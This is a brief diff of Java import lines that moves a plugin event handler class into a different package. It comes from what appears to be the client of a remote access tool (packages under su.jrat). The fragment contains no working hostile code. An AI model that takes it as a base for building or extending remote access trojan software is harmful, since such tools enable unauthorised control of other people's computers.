@@ -21,7 +21,6 @@ import javax.swing.ImageIcon;
 
 import su.jrat.client.crypto.GlobalKeyPair;
 import su.jrat.client.exceptions.CloseException;
-import su.jrat.client.extensions.PluginEventHandler;
 import su.jrat.client.ip2c.Country;
 import su.jrat.client.net.ConnectionHandler;
 import su.jrat.client.net.PortListener;
@@ -29,6 +28,7 @@ import su.jrat.client.packets.incoming.IncomingPackets;
 import su.jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import su.jrat.client.packets.outgoing.Packet0Ping;
 import su.jrat.client.packets.outgoing.Packet99Encryption;
+import su.jrat.client.plugins.PluginEventHandler;
 import su.jrat.client.settings.Settings;
 import su.jrat.client.ui.frames.Frame;
 import su.jrat.client.ui.panels.PanelMainLog;
